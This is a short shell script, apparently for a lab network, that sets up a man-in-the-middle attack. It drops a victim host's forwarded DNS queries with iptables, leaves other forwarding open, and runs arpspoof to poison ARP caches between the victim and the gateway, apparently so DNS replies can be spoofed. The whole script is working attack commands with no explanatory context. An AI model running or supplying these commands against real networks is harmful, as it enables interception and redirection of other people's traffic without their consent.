#!/bin/sh
iptables -A FORWARD -p udp -s 192.168.122.172 --dport 53 -j DROP
iptables --policy FORWARD ACCEPT
arpspoof -i eth0 -t 192.168.122.1 -r 192.168.122.172 
